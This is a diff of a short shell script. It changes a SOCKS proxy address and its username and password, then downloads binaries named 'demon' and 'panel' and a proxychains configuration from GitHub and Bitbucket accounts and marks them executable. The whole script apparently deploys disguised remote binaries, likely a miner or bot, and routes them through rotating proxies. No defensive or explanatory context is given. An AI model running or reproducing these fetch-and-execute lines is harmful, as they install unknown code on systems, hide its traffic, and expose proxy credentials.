@@ -1,7 +1,7 @@
-proxy="50.17.160.202" 
+proxy="34.238.108.61" 
 port="1080" 
-user="9ubn1puea2b71x"  
-pass="iz4g9xbwjgy4mdru9gb9x5nsee40"
+user="jsnctokdtdnt39"  
+pass="aed3e1p4cuj4cxkdlvdxng7m304l"
 wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
